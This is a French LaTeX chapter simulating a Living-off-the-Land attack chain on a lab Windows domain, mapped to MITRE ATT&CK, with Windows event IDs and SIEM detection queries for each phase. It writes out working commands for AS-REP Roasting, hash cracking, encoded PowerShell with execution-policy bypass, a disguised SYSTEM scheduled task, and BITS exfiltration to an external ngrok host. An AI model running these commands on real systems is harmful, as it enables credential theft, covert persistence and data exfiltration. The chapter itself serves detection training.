\chapter{Simulation complète de l'attaque}

\section{Introduction}

Ce chapitre présente la simulation détaillée de l'attaque menée contre le serveur Windows dans un environnement contrôlé. L'objectif est de reproduire une chaîne d'attaque réaliste utilisant des techniques « Living off the Land » (LotL), c'est-à-dire en s'appuyant principalement sur des outils légitimes du système Windows.

La chaîne d'attaque suit le modèle Cyber Kill Chain et couvre les phases suivantes :
\begin{enumerate}
\item \textbf{Initial Access} : AS-REP Roasting
\item \textbf{Credential Access} : Craquage hors-ligne des hash
\item \textbf{Execution} : Commandes PowerShell encodées
\item \textbf{Discovery} : Reconnaissance du système
\item \textbf{Persistence} : Création de tâches planifiées
\item \textbf{Exfiltration} : Transfert de données via BITS
\end{enumerate}

\section{Phase 1 : Initial Access - AS-REP Roasting}

\subsection{Principe de l'attaque}

L'AS-REP Roasting est une technique d'attaque Kerberos qui exploite les comptes utilisateurs pour lesquels la pré-authentification Kerberos n'est pas requise. Lorsqu'un compte a l'attribut « Do not require Kerberos preauthentication » activé, un attaquant peut demander un ticket TGT (Ticket Granting Ticket) sans fournir de preuve d'identité.

Le ticket reçu contient une partie chiffrée avec le mot de passe de l'utilisateur, qui peut être craqué hors-ligne.

\subsection{Exécution de l'attaque}

\subsubsection{Préparation de la liste d'utilisateurs}

Sur la machine attaquante (Kali Linux), nous préparons une liste de noms d'utilisateurs potentiels :

\begin{lstlisting}[language=bash, caption={Liste d'utilisateurs cibles}]
# Contenu du fichier username.txt
Administrator
Admin
Guest
SQLAdmin
ServiceAccount
jaber
\end{lstlisting}

\subsubsection{Exécution d'AS-REP Roasting avec Impacket}

Nous utilisons l'outil \texttt{impacket-GetNPUsers} pour tenter de récupérer les hash AS-REP :

\begin{lstlisting}[language=bash, caption={Commande AS-REP Roasting}]
impacket-GetNPUsers ooc.local/ -usersfile username.txt \
  -format hashcat -dc-ip 192.168.134.85
\end{lstlisting}

\textbf{Paramètres :}
\begin{itemize}
\item \texttt{ooc.local/} : Domaine cible
\item \texttt{-usersfile username.txt} : Fichier contenant la liste des utilisateurs
\item \texttt{-format hashcat} : Format de sortie compatible avec Hashcat/John
\item \texttt{-dc-ip 192.168.134.85} : Adresse IP du contrôleur de domaine
\end{itemize}

\textbf{Résultat :} L'outil identifie que l'utilisateur \texttt{jaber} a la pré-authentification désactivée et retourne son hash AS-REP.

\begin{figure}[H]
\centering
\includegraphics[width=0.9\textwidth]{context/AS-REP Roasting Attack.png}
\caption{Capture d'écran de l'attaque AS-REP Roasting avec Impacket}
\label{fig:asrep-roasting}
\end{figure}

\subsection{Traces laissées dans les logs}

Cette attaque génère les événements suivants dans les logs Windows :
\begin{itemize}
\item \textbf{Event ID 4768} : Demande de ticket TGT avec \texttt{PreAuthType = 0}
\item \textbf{Event ID 4776} : Tentatives d'authentification multiples
\end{itemize}

\textbf{Requête SIEM pour détecter l'AS-REP Roasting :}
\begin{lstlisting}[language=SQL, caption={Détection AS-REP Roasting dans Elastic}]
event.code: 4768 AND winlog.event_data.PreAuthType: 0
\end{lstlisting}

\section{Phase 2 : Credential Access - Craquage hors-ligne}

\subsection{Extraction du hash}

Le hash AS-REP récupéré est sauvegardé dans un fichier :

\begin{lstlisting}[language=bash, caption={Fichier hash.txt}]
$krb5asrep$23$jaber@OOC.LOCAL:hash_data...
\end{lstlisting}

\subsection{Craquage avec John The Ripper}

Nous utilisons John The Ripper pour craquer le hash en mode dictionnaire :

\begin{lstlisting}[language=bash, caption={Craquage du hash avec John}]
john --wordlist=passwords.txt --format=krb5asrep hash.txt
\end{lstlisting}

\textbf{Résultat obtenu :}
\begin{itemize}
\item \textbf{Username :} jaber
\item \textbf{Password :} P@ssw0rd123
\end{itemize}

\begin{figure}[H]
\centering
\includegraphics[width=0.9\textwidth]{context/Offline Password Cracking with Jhon The Reaper.png}
\caption{Craquage hors-ligne du mot de passe avec John The Ripper}
\label{fig:password-cracking}
\end{figure}

Le craquage hors-ligne présente l'avantage pour l'attaquant de ne laisser aucune trace supplémentaire sur le système cible, car il s'effectue entièrement sur la machine de l'attaquant.

\section{Phase 3 : Execution - Accès RDP et PowerShell encodé}

\subsection{Connexion RDP}

Avec les credentials compromis, l'attaquant se connecte au serveur via RDP :

\begin{lstlisting}[language=bash, caption={Connexion RDP depuis Kali Linux}]
# Sur Kali Linux, utilisation de remmina ou xfreerdp
remmina
# Ou
xfreerdp /u:jaber /p:P@ssw0rd123 /v:192.168.134.85
\end{lstlisting}

\begin{figure}[H]
\centering
\includegraphics[width=0.9\textwidth]{context/Access to the machine victim via RDP.png}
\caption{Accès à la machine victime via RDP}
\label{fig:rdp-access}
\end{figure}

\textbf{Traces dans les logs :}
\begin{itemize}
\item \textbf{Event ID 4624} : Successful logon (Type 10 = Remote Interactive)
\item \textbf{Event ID 4648} : Logon avec credentials explicites
\item Sysmon Event ID 3 : Connexion réseau établie
\end{itemize}

\subsection{Exécution de PowerShell encodé - Vérification des privilèges}

Une fois connecté, l'attaquant exécute une commande PowerShell encodée pour vérifier ses privilèges :

\subsubsection{Préparation du script sur Kali}

\begin{lstlisting}[language=bash, caption={Encodage du script PowerShell sur Kali}]
echo -n "Write-Host '--- Privilege Status ---'; \
[Security.Principal.WindowsPrincipal] \
[Security.Principal.WindowsIdentity]::GetCurrent() \
.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator); \
Write-Host '--- Sensitive Files ---'; \
Get-ChildItem -Path C:\ -Include *.kdbx, *.bak \
-Recurse -ErrorAction SilentlyContinue | \
Select-Object FullName" | iconv -t UTF-16LE | base64 -w 0
\end{lstlisting}

Cette commande :
\begin{enumerate}
\item Vérifie si l'utilisateur a des privilèges administrateur
\item Recherche des fichiers sensibles (KeePass \texttt{.kdbx}, backups \texttt{.bak})
\item Encode le tout en Base64 UTF-16LE (format attendu par PowerShell)
\end{enumerate}

\subsubsection{Exécution sur Windows Server}

\begin{lstlisting}[language=powershell, caption={Exécution PowerShell encodée}]
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Enc <base64_encoded_command> >> pcheck.txt
\end{lstlisting}

\textbf{Paramètres :}
\begin{itemize}
\item \texttt{-ExecutionPolicy Bypass} : Contourne les restrictions d'exécution
\item \texttt{-WindowStyle Hidden} : Fenêtre masquée
\item \texttt{-Enc} : Commande encodée en Base64
\item \texttt{>> pcheck.txt} : Redirection de la sortie
\end{itemize}

\textbf{Traces dans les logs :}
\begin{itemize}
\item \textbf{Event ID 4104} : PowerShell Script Block Logging (capture le script décodé)
\item Sysmon Event ID 1 : Création du processus \texttt{powershell.exe}
\end{itemize}

\textbf{Requête SIEM pour détecter PowerShell encodé :}
\begin{lstlisting}[language=SQL, caption={Détection PowerShell encodé}]
event.code: 4104 AND 
(message: "*-Enc*" OR message: "*-EncodedCommand*" OR 
 message: "*JAB*" OR message: "*SUY*")
\end{lstlisting}

\section{Phase 4 : Discovery - Reconnaissance du système}

\subsection{Recherche de fichiers sensibles}

L'attaquant exécute une seconde commande PowerShell encodée pour rechercher des fichiers spécifiques :

\begin{lstlisting}[language=powershell, caption={Recherche de fichiers sensibles}]
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Enc <encoded_discovery_script> >> discovery.txt
\end{lstlisting}

Le script recherche :
\begin{itemize}
\item Fichiers \texttt{.kdbx} (bases de données KeePass)
\item Fichiers \texttt{.bak} (backups)
\item Fichiers \texttt{.vhdx} (disques virtuels)
\end{itemize}

\subsection{Énumération Active Directory}

L'attaquant peut également énumérer les informations du domaine :

\begin{lstlisting}[language=powershell, caption={Énumération Active Directory}]
# Lister les utilisateurs du domaine
Get-ADUser -Filter *

# Lister les groupes
Get-ADGroup -Filter *

# Identifier les administrateurs
Get-ADGroupMember "Domain Admins"
\end{lstlisting}

\section{Phase 5 : Persistence - Création de tâche planifiée}

\subsection{Objectif de la persistance}

Pour maintenir l'accès et automatiser l'exfiltration, l'attaquant crée une tâche planifiée malveillante qui se fait passer pour une tâche légitime.

\subsection{Création du script d'exfiltration}

\begin{lstlisting}[language=powershell, caption={Script d'exfiltration exfil.ps1}]
Set-Content -Path "C:\Users\Public\exfil.ps1" -Value `
'bitsadmin /transfer "LogUpload" /upload /priority high `
https://yoko-kilometrical-federico.ngrok-free.dev/update.zip `
C:\Users\Public\update.zip'
\end{lstlisting}

\subsection{Compression des données cibles}

\begin{lstlisting}[language=powershell, caption={Compression des fichiers à exfiltrer}]
Compress-Archive -Path "E:\WindowsImageBackup\WINOTH6RGRFFNA\Logs\Backup_Error-30-12-2025*" `
-DestinationPath "C:\Users\Public\update.zip" -Force
\end{lstlisting}

\subsection{Création de la tâche planifiée}

L'attaquant utilise \texttt{schtasks.exe} pour créer une tâche qui semble légitime :

\begin{lstlisting}[language=bash, caption={Création de tâche planifiée malveillante}]
schtasks /create /tn "Microsoft\Windows\CertificateServices\CertValidation" `
/tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Public\exfil.ps1" `
/sc minute /mo 5 /ru "SYSTEM" /f
\end{lstlisting}

\textbf{Paramètres :}
\begin{itemize}
\item \texttt{/tn} : Nom de la tâche (masquerade dans un dossier Microsoft légitime)
\item \texttt{/tr} : Commande à exécuter
\item \texttt{/sc minute /mo 5} : Exécution toutes les 5 minutes
\item \texttt{/ru "SYSTEM"} : Exécution avec les privilèges SYSTEM
\item \texttt{/f} : Force la création (écrase si existe)
\end{itemize}

\textbf{Traces dans les logs :}
\begin{itemize}
\item \textbf{Event ID 4698} : Création d'une tâche planifiée
\item Sysmon Event ID 1 : Création de processus \texttt{schtasks.exe}
\end{itemize}

\textbf{Requête SIEM pour détecter les tâches planifiées suspectes :}
\begin{lstlisting}[language=SQL, caption={Détection création de tâches planifiées}]
event.code: 4698 AND 
(process.command_line: "*powershell*" OR 
 process.command_line: "*-Enc*")
\end{lstlisting}

\section{Phase 6 : Exfiltration - Transfert via BITS}

\subsection{Principe de l'exfiltration via BITS}

BITS (Background Intelligent Transfer Service) est un composant légitime de Windows utilisé pour les transferts de fichiers en arrière-plan. Les attaquants l'utilisent car :
\begin{itemize}
\item Il est signé par Microsoft (confiance)
\item Il peut opérer en arrière-plan
\item Il génère moins d'alertes que les outils réseau classiques
\item Il persiste aux redémarrages
\end{itemize}

\subsection{Exécution de l'exfiltration}

La tâche planifiée exécute périodiquement le script d'exfiltration :

\begin{lstlisting}[language=bash, caption={Commande BITS pour exfiltration}]
bitsadmin /transfer "LogUpload" /upload /priority high `
https://attacker-server.ngrok-free.dev/update.zip `
C:\Users\Public\update.zip
\end{lstlisting}

\subsection{Traces de l'exfiltration}

\textbf{Logs Windows :}
\begin{itemize}
\item Sysmon Event ID 1 : Processus \texttt{bitsadmin.exe}
\item Sysmon Event ID 3 : Connexion réseau vers IP externe
\item Event ID 59 : BITS job started
\end{itemize}

\textbf{Requête SIEM pour détecter l'exfiltration BITS :}
\begin{lstlisting}[language=SQL, caption={Détection exfiltration via BITS}]
process.name: "bitsadmin.exe" AND 
(process.command_line: "*upload*" OR 
 destination.ip: (NOT 192.168.0.0/16 AND NOT 10.0.0.0/8))
\end{lstlisting}

\section{Timeline complète de l'attaque}

\begin{table}[H]
\centering
\small
\begin{tabular}{@{}llp{6cm}l@{}}
\toprule
\textbf{T+} & \textbf{Phase} & \textbf{Action} & \textbf{Technique} \\ \midrule
00:00 & Initial Access & AS-REP Roasting & T1558.004 \\
00:05 & Credential Access & Craquage hash offline & T1110 \\
00:15 & Execution & Connexion RDP & T1021.001 \\
00:20 & Execution & PowerShell encodé & T1059.001 \\
00:25 & Discovery & Énumération fichiers & T1083 \\
00:30 & Persistence & Création tâche planifiée & T1053.005 \\
00:35 & Collection & Compression données & T1560 \\
00:40 & Exfiltration & Transfert BITS & T1197 \\ \bottomrule
\end{tabular}
\caption{Timeline de l'attaque avec mapping MITRE ATT\&CK}
\label{tab:attack-timeline}
\end{table}

\section{Conclusion}

Ce chapitre a détaillé la simulation complète d'une attaque sophistiquée utilisant des techniques « Living off the Land ». Chaque phase de l'attaque a été documentée avec :
\begin{itemize}
\item Les commandes exactes exécutées
\item Les figures illustrant les étapes clés
\item Les traces laissées dans les logs Windows
\item Les requêtes SIEM pour détecter chaque technique
\item Le mapping MITRE ATT\&CK correspondant
\end{itemize}

Le chapitre suivant présentera l'investigation complète utilisant la méthode ACH (Analysis of Competing Hypotheses) pour analyser ces événements, formuler des hypothèses, et déterminer la nature réelle de l'activité observée.
